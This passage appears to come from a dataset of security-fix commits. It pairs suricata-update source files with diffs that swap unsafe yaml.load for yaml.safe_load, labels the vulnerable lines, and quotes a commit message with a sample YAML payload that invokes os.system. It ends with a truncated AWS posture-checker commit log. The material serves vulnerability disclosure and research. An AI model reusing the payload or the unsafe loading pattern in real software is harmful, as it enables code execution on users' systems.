LOCAL_CONF_KEY:[], \"ignore\":[ \"*deleted.rules\", ], } _args=None _config={} def set(key, value): \"\"\"Set a configuration value.\"\"\" _config[key]=value def get(key): \"\"\"Get a configuration value.\"\"\" if key in _config: return _config[key] return None def set_state_dir(directory): _config[DATA_DIRECTORY_KEY]=directory def get_state_dir(): \"\"\"Get the data directory. This is more of the Suricata state directory than a specific Suricata-Update directory, and is used as the root directory for Suricata-Update data. \"\"\" if os.getenv(\"DATA_DIRECTORY\"): return os.getenv(\"DATA_DIRECTORY\") if DATA_DIRECTORY_KEY in _config: return _config[DATA_DIRECTORY_KEY] return DEFAULT_DATA_DIRECTORY def set_cache_dir(directory): \"\"\"Set an alternate cache directory.\"\"\" _config[CACHE_DIRECTORY_KEY]=directory def get_cache_dir(): \"\"\"Get the cache directory.\"\"\" if CACHE_DIRECTORY_KEY in _config: return _config[CACHE_DIRECTORY_KEY] return os.path.join(get_state_dir(), CACHE_DIRECTORY) def get_output_dir(): \"\"\"Get the rule output directory.\"\"\" if OUTPUT_KEY in _config: return _config[OUTPUT_KEY] return os.path.join(get_state_dir(), \"rules\") def args(): \"\"\"Return sthe parsed argument object.\"\"\" return _args def get_arg(key): key=key.replace(\"-\", \"_\") if hasattr(_args, key): val=getattr(_args, key) if val not in[[], None]: return val return None def init(args): global _args _args=args _config.update(DEFAULT_CONFIG) for suriyaml in DEFAULT_SURICATA_YAML_PATH: if os.path.exists(suriyaml): _config[\"suricata-conf\"]=suriyaml break if args.config: logger.info(\"Loading %s\", args.config) with open(args.config, \"rb\") as fileobj: config=yaml.load(fileobj) if config: _config.update(config) elif os.path.exists(DEFAULT_UPDATE_YAML_PATH): logger.info(\"Loading %s\", DEFAULT_UPDATE_YAML_PATH) with open(DEFAULT_UPDATE_YAML_PATH, \"rb\") as fileobj: config=yaml.load(fileobj) if config: _config.update(config) for arg in vars(args): if arg==\"local\": for local in args.local: logger.debug(\"Adding local ruleset to config: %s\", local) _config[LOCAL_CONF_KEY].append(local) elif arg==\"data_dir\" and args.data_dir: logger.debug(\"Setting data directory to %s\", args.data_dir) _config[DATA_DIRECTORY_KEY]=args.data_dir elif getattr(args, arg): _config[arg.replace(\"_\", \"-\")]=getattr(args, arg) ","sourceWithComments":"# Copyright (C) 2017 Open Information Security Foundation\n# Copyright (c) 2015-2017 Jason Ish\n#\n# You can copy, redistribute or modify this Program under the terms of\n# the GNU General Public License version 2 as published by the Free\n# Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# version 2 along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n# 02110-1301, USA.\n\nimport os.path\nimport logging\n\nimport yaml\n\nlogger = logging.getLogger()\n\nDEFAULT_DATA_DIRECTORY = \"\/var\/lib\/suricata\"\n\n# Cache directory - relative to the data directory.\nCACHE_DIRECTORY = os.path.join(\"update\", \"cache\")\n\n# Source directory - relative to the data directory.\nSOURCE_DIRECTORY = os.path.join(\"update\", \"sources\")\n\n# Configuration keys.\nDATA_DIRECTORY_KEY = \"data-directory\"\nCACHE_DIRECTORY_KEY = \"cache-directory\"\nIGNORE_KEY = \"ignore\"\nDISABLE_CONF_KEY = \"disable-conf\"\nENABLE_CONF_KEY = \"enable-conf\"\nMODIFY_CONF_KEY = \"modify-conf\"\nDROP_CONF_KEY = \"drop-conf\"\nLOCAL_CONF_KEY = \"local\"\nOUTPUT_KEY = \"output\"\n\nDEFAULT_UPDATE_YAML_PATH = \"\/etc\/suricata\/update.yaml\"\n\nDEFAULT_SURICATA_YAML_PATH = [\n    \"\/etc\/suricata\/suricata.yaml\",\n    \"\/usr\/local\/etc\/suricata\/suricata.yaml\",\n    \"\/etc\/suricata\/suricata-debian.yaml\"\n]\n\nDEFAULT_CONFIG = {\n    \"disable-conf\": \"\/etc\/suricata\/disable.conf\",\n    \"enable-conf\": \"\/etc\/suricata\/enable.conf\",\n    \"drop-conf\": \"\/etc\/suricata\/drop.conf\",\n    \"modify-conf\": \"\/etc\/suricata\/modify.conf\",\n    \"suricata-conf\": \"\/etc\/suricata\/suricata.conf\",\n    \"sources\": [],\n    LOCAL_CONF_KEY: [],\n\n    # The default file patterns to ignore.\n    \"ignore\": [\n        \"*deleted.rules\",\n    ],\n}\n\n_args = None\n_config = {}\n\ndef set(key, value):\n    \"\"\"Set a configuration value.\"\"\"\n    _config[key] = value\n\ndef get(key):\n    \"\"\"Get a configuration value.\"\"\"\n    if key in _config:\n        return _config[key]\n    return None\n\ndef set_state_dir(directory):\n    _config[DATA_DIRECTORY_KEY] = directory\n\ndef get_state_dir():\n    \"\"\"Get the data directory. This is more of the Suricata state\n    directory than a specific Suricata-Update directory, and is used\n    as the root directory for Suricata-Update data.\n    \"\"\"\n    if os.getenv(\"DATA_DIRECTORY\"):\n        return os.getenv(\"DATA_DIRECTORY\")\n    if DATA_DIRECTORY_KEY in _config:\n        return _config[DATA_DIRECTORY_KEY]\n    return DEFAULT_DATA_DIRECTORY\n\ndef set_cache_dir(directory):\n    \"\"\"Set an alternate cache directory.\"\"\"\n    _config[CACHE_DIRECTORY_KEY] = directory\n\ndef get_cache_dir():\n    \"\"\"Get the cache directory.\"\"\"\n    if CACHE_DIRECTORY_KEY in _config:\n        return _config[CACHE_DIRECTORY_KEY]\n    return os.path.join(get_state_dir(), CACHE_DIRECTORY)\n\ndef get_output_dir():\n    \"\"\"Get the rule output directory.\"\"\"\n    if OUTPUT_KEY in _config:\n        return _config[OUTPUT_KEY]\n    return os.path.join(get_state_dir(), \"rules\")\n\ndef args():\n    \"\"\"Return sthe parsed argument object.\"\"\"\n    return _args\n\ndef get_arg(key):\n    key = key.replace(\"-\", \"_\")\n    if hasattr(_args, key):\n        val = getattr(_args, key)\n        if val not in [[], None]:\n            return val\n    return None\n\ndef init(args):\n    global _args\n\n    _args = args\n    _config.update(DEFAULT_CONFIG)\n\n    for suriyaml in DEFAULT_SURICATA_YAML_PATH:\n        if os.path.exists(suriyaml):\n            _config[\"suricata-conf\"] = suriyaml\n            break\n\n    if args.config:\n        logger.info(\"Loading %s\", args.config)\n        with open(args.config, \"rb\") as fileobj:\n            config = yaml.load(fileobj)\n            if config:\n                _config.update(config)\n    elif os.path.exists(DEFAULT_UPDATE_YAML_PATH):\n        logger.info(\"Loading %s\", DEFAULT_UPDATE_YAML_PATH)\n        with open(DEFAULT_UPDATE_YAML_PATH, \"rb\") as fileobj:\n            config = yaml.load(fileobj)\n            if config:\n                _config.update(config)\n\n    # Apply command line arguments to the config.\n\n    for arg in vars(args):\n        if arg == \"local\":\n            for local in args.local:\n                logger.debug(\"Adding local ruleset to config: %s\", local)\n                _config[LOCAL_CONF_KEY].append(local)\n        elif arg == \"data_dir\" and args.data_dir:\n            logger.debug(\"Setting data directory to %s\", args.data_dir)\n            _config[DATA_DIRECTORY_KEY] = args.data_dir\n        elif getattr(args, arg):\n            _config[arg.replace(\"_\", \"-\")] = getattr(args, arg)\n"},"\/suricata\/update\/sources.py":{"changes":[{"diff":"\n         self.reload()\n \n     def reload(self):\n-        index = yaml.load(open(self.filename, \"rb\"))\n+        index = yaml.safe_load(open(self.filename, \"rb\"))\n         self.index = index\n \n     def resolve_url(self, name, params={}):\n","add":1,"remove":1,"filename":"\/suricata\/update\/sources.py","badparts":["        index = yaml.load(open(self.filename, \"rb\"))"],"goodparts":["        index = yaml.safe_load(open(self.filename, \"rb\"))"]},{"diff":"\n         for filename in filenames:\n             if filename.endswith(\".yaml\"):\n                 path = os.path.join(dirpath, filename)\n-                source = yaml.load(open(path, \"rb\"))\n+                source = yaml.safe_load(open(path, \"rb\"))\n                 sources[source[\"source\"]] = source\n \n                 if \"params\" in source:\n","add":1,"remove":1,"filename":"\/suricata\/update\/sources.py","badparts":["                source = yaml.load(open(path, \"rb\"))"],"goodparts":["                source = yaml.safe_load(open(path, \"rb\"))"]},{"diff":"\n         self.reload()\n \n     def reload(self):\n-        index = yaml.load(open(self.filename, \"rb\"))\n+        index = yaml.safe_load(open(self.filename, \"rb\"))\n         self.index = index\n \n     def resolve_url(self, name, params={}):\n","add":1,"remove":1,"filename":"\/suricata\/update\/sources.py","badparts":["        index = yaml.load(open(self.filename, \"rb\"))"],"goodparts":["        index = yaml.safe_load(open(self.filename, \"rb\"))"]},{"diff":"\n         for filename in filenames:\n             if filename.endswith(\".yaml\"):\n                 path = os.path.join(dirpath, filename)\n-                source = yaml.load(open(path, \"rb\"))\n+                source = yaml.safe_load(open(path, \"rb\"))\n                 sources[source[\"source\"]] = source\n \n                 if \"params\" in source:\n","add":1,"remove":1,"filename":"\/suricata\/update\/sources.py","badparts":["                source = yaml.load(open(path, \"rb\"))"],"goodparts":["                source = yaml.safe_load(open(path, \"rb\"))"]}],"source":"\n from __future__ import print_function import os import logging import io import argparse import yaml from suricata.update import config from suricata.update import net from suricata.update import util from suricata.update import loghandler logger=logging.getLogger() DEFAULT_SOURCE_INDEX_URL=\"https:\/\/www.openinfosecfoundation.org\/rules\/index.yaml\" SOURCE_INDEX_FILENAME=\"index.yaml\" DEFAULT_ETOPEN_URL=\"https:\/\/rules.emergingthreats.net\/open\/suricata-%(__version__)s\/emerging.rules.tar.gz\" def get_source_directory(): \"\"\"Return the directory where source configuration files are kept.\"\"\" return os.path.join(config.get_state_dir(), config.SOURCE_DIRECTORY) def get_index_filename(): return os.path.join(config.get_cache_dir(), SOURCE_INDEX_FILENAME) def get_enabled_source_filename(name): return os.path.join(get_source_directory(), \"%s.yaml\" %( safe_filename(name))) def get_disabled_source_filename(name): return os.path.join(get_source_directory(), \"%s.yaml.disabled\" %( safe_filename(name))) def source_name_exists(name): \"\"\"Return True if a source already exists with name.\"\"\" if os.path.exists(get_enabled_source_filename(name)) or \\ os.path.exists(get_disabled_source_filename(name)): return True return False def source_index_exists(config): \"\"\"Return True if the source index file exists.\"\"\" return os.path.exists(get_index_filename()) def get_source_index_url(): if os.getenv(\"SOURCE_INDEX_URL\"): return os.getenv(\"SOURCE_INDEX_URL\") return DEFAULT_SOURCE_INDEX_URL def save_source_config(source_config): with open(get_enabled_source_filename(source_config.name), \"w\") as fileobj: fileobj.write(yaml.safe_dump( source_config.dict(), default_flow_style=False)) class SourceConfiguration: def __init__(self, name, url=None, params={}): self.name=name self.url=url self.params=params def dict(self): d={ \"source\": self.name, } if self.url: d[\"url\"]=self.url if self.params: d[\"params\"]=self.params return d class Index: def __init__(self, filename): self.filename=filename self.index={} self.reload() def reload(self): index=yaml.load(open(self.filename, \"rb\")) self.index=index def resolve_url(self, name, params={}): if not name in self.index[\"sources\"]: raise Exception(\"Source name not in index: %s\" %(name)) source=self.index[\"sources\"][name] try: return source[\"url\"] % params except KeyError as err: raise Exception(\"Missing URL parameter: %s\" %(str(err.args[0]))) def get_sources(self): return self.index[\"sources\"] def get_source_by_name(self, name): if name in self.index[\"sources\"]: return self.index[\"sources\"][name] return None def load_source_index(config): return Index(get_index_filename()) def get_enabled_sources(): \"\"\"Return a map of enabled sources, keyed by name.\"\"\" if not os.path.exists(get_source_directory()): return{} sources={} for dirpath, dirnames, filenames in os.walk(get_source_directory()): for filename in filenames: if filename.endswith(\".yaml\"): path=os.path.join(dirpath, filename) source=yaml.load(open(path, \"rb\")) sources[source[\"source\"]]=source if \"params\" in source: for param in source[\"params\"]: if param.startswith(\"secret\"): loghandler.add_secret(source[\"params\"][param], param) return sources def remove_source(config): name=config.args.name enabled_source_filename=get_enabled_source_filename(name) if os.path.exists(enabled_source_filename): logger.debug(\"Deleting file %s.\", enabled_source_filename) os.remove(enabled_source_filename) logger.info(\"Source %s removed, previously enabled.\", name) return 0 disabled_source_filename=get_disabled_source_filename(name) if os.path.exists(disabled_source_filename): logger.debug(\"Deleting file %s.\", disabled_source_filename) os.remove(disabled_source_filename) logger.info(\"Source %s removed, previously disabled.\", name) return 0 logger.warning(\"Source %s does not exist.\", name) return 1 def safe_filename(name): \"\"\"Utility function to make a source short-name safe as a filename.\"\"\" name=name.replace(\"\/\", \"-\") return name def get_etopen_url(params): if os.getenv(\"ETOPEN_URL\"): return os.getenv(\"ETOPEN_URL\") % params return DEFAULT_ETOPEN_URL % params ","sourceWithComments":"# Copyright (C) 2017 Open Information Security Foundation\n#\n# You can copy, redistribute or modify this Program under the terms of\n# the GNU General Public License version 2 as published by the Free\n# Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# version 2 along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n# 02110-1301, USA.\n\nfrom __future__ import print_function\n\nimport os\nimport logging\nimport io\nimport argparse\n\nimport yaml\n\nfrom suricata.update import config\nfrom suricata.update import net\nfrom suricata.update import util\nfrom suricata.update import loghandler\n\nlogger = logging.getLogger()\n\nDEFAULT_SOURCE_INDEX_URL = \"https:\/\/www.openinfosecfoundation.org\/rules\/index.yaml\"\nSOURCE_INDEX_FILENAME = \"index.yaml\"\n\nDEFAULT_ETOPEN_URL = \"https:\/\/rules.emergingthreats.net\/open\/suricata-%(__version__)s\/emerging.rules.tar.gz\"\n\ndef get_source_directory():\n    \"\"\"Return the directory where source configuration files are kept.\"\"\"\n    return os.path.join(config.get_state_dir(), config.SOURCE_DIRECTORY)\n\ndef get_index_filename():\n    return os.path.join(config.get_cache_dir(), SOURCE_INDEX_FILENAME)\n\ndef get_enabled_source_filename(name):\n    return os.path.join(get_source_directory(), \"%s.yaml\" % (\n        safe_filename(name)))\n\ndef get_disabled_source_filename(name):\n    return os.path.join(get_source_directory(), \"%s.yaml.disabled\" % (\n        safe_filename(name)))\n\ndef source_name_exists(name):\n    \"\"\"Return True if a source already exists with name.\"\"\"\n    if os.path.exists(get_enabled_source_filename(name)) or \\\n       os.path.exists(get_disabled_source_filename(name)):\n        return True\n    return False\n\ndef source_index_exists(config):\n    \"\"\"Return True if the source index file exists.\"\"\"\n    return os.path.exists(get_index_filename())\n\ndef get_source_index_url():\n    if os.getenv(\"SOURCE_INDEX_URL\"):\n        return os.getenv(\"SOURCE_INDEX_URL\")\n    return DEFAULT_SOURCE_INDEX_URL\n\ndef save_source_config(source_config):\n    with open(get_enabled_source_filename(source_config.name), \"w\") as fileobj:\n        fileobj.write(yaml.safe_dump(\n            source_config.dict(), default_flow_style=False))\n\nclass SourceConfiguration:\n\n    def __init__(self, name, url=None, params={}):\n        self.name = name\n        self.url = url\n        self.params = params\n\n    def dict(self):\n        d = {\n            \"source\": self.name,\n        }\n        if self.url:\n            d[\"url\"] = self.url\n        if self.params:\n            d[\"params\"] = self.params\n        return d\n\nclass Index:\n\n    def __init__(self, filename):\n        self.filename = filename\n        self.index = {}\n        self.reload()\n\n    def reload(self):\n        index = yaml.load(open(self.filename, \"rb\"))\n        self.index = index\n\n    def resolve_url(self, name, params={}):\n        if not name in self.index[\"sources\"]:\n            raise Exception(\"Source name not in index: %s\" % (name))\n        source = self.index[\"sources\"][name]\n        try:\n            return source[\"url\"] % params\n        except KeyError as err:\n            raise Exception(\"Missing URL parameter: %s\" % (str(err.args[0])))\n\n    def get_sources(self):\n        return self.index[\"sources\"]\n\n    def get_source_by_name(self, name):\n        if name in self.index[\"sources\"]:\n            return self.index[\"sources\"][name]\n        return None\n\ndef load_source_index(config):\n    return Index(get_index_filename())\n\ndef get_enabled_sources():\n    \"\"\"Return a map of enabled sources, keyed by name.\"\"\"\n    if not os.path.exists(get_source_directory()):\n        return {}\n    sources = {}\n    for dirpath, dirnames, filenames in os.walk(get_source_directory()):\n        for filename in filenames:\n            if filename.endswith(\".yaml\"):\n                path = os.path.join(dirpath, filename)\n                source = yaml.load(open(path, \"rb\"))\n                sources[source[\"source\"]] = source\n\n                if \"params\" in source:\n                    for param in source[\"params\"]:\n                        if param.startswith(\"secret\"):\n                            loghandler.add_secret(source[\"params\"][param], param)\n\n    return sources\n\ndef remove_source(config):\n    name = config.args.name\n\n    enabled_source_filename = get_enabled_source_filename(name)\n    if os.path.exists(enabled_source_filename):\n        logger.debug(\"Deleting file %s.\", enabled_source_filename)\n        os.remove(enabled_source_filename)\n        logger.info(\"Source %s removed, previously enabled.\", name)\n        return 0\n\n    disabled_source_filename = get_disabled_source_filename(name)\n    if os.path.exists(disabled_source_filename):\n        logger.debug(\"Deleting file %s.\", disabled_source_filename)\n        os.remove(disabled_source_filename)\n        logger.info(\"Source %s removed, previously disabled.\", name)\n        return 0\n\n    logger.warning(\"Source %s does not exist.\", name)\n    return 1\n\ndef safe_filename(name):\n    \"\"\"Utility function to make a source short-name safe as a\n    filename.\"\"\"\n    name = name.replace(\"\/\", \"-\")\n    return name\n\ndef get_etopen_url(params):\n    if os.getenv(\"ETOPEN_URL\"):\n        return os.getenv(\"ETOPEN_URL\") % params\n    return DEFAULT_ETOPEN_URL % params\n"}},"msg":"(Remote)Code-Execution while loading yaml-file\n\nThe list of possible sources for suricata-update is downloaded from \"https:\/\/www.openinfosecfoundation.org\/rules\/index.yaml\" per default. Suricata-Update uses the insecure yaml.load()-function. Code will be executed if the yaml-file contains lines like:\n\nhello: !!python\/object\/apply:os.system ['ls -l > \/tmp\/output']\n\nThe vulnerable function can be triggered by \"suricata-update list-sources\". The locally stored index.yaml will be loaded in this function and the malicious code gets executed.\n\nThis commit fixes Bug #2359"}},"https:\/\/github.com\/trieloff\/coralogix-aws-serverless":{"63cd07d2354dcaf90d367adf0ebf75067a24ace3":{"url":"https:\/\/api.github.com\/repos\/trieloff\/coralogix-aws-serverless\/commits\/63cd07d2354dcaf90d367adf0ebf75067a24ace3","html_url":"https:\/\/github.com\/trieloff\/coralogix-aws-serverless\/commit\/63cd07d2354dcaf90d367adf0ebf75067a24ace3","message":"Auto posture evaluator\/kms antstack (#133)\n\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\n* Add result object helper method\r\n\r\n* Change testname according to the convention\r\n\r\n* Lambda extension architecture optionality added (#59)\r\n\r\n* Europe2 endpoint added (#60)\r\n\r\n* CloudWatch Fix\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper 